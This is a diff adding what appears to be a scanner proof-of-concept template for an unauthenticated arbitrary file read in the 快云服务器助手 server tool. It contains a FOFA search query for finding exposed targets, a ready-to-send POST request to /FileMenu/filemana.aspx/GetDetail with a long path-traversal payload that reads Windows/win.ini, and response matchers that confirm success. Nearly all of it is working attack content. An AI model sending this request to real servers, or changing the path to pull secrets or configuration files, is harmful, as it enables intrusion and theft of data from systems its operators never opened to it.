@@ -1,0 +1,27 @@
+## id: VEID-2025-0109
+## name: 快云服务器助手GetDetail任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: 快云服务器助手 filemana.aspx/GetDetail 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
+## fofa-query: title="快云服务器助手"
+## verification: true
+
+
+POST /FileMenu/filemana.aspx/GetDetail HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/json; charset=utf-8
+
+{"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "json"
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+
+
+
+
+
+# @VEIL-STAMP: bfe45d25c34f46626a9768f99cb70c1a5190562e394de4c28c11bc600270aec3
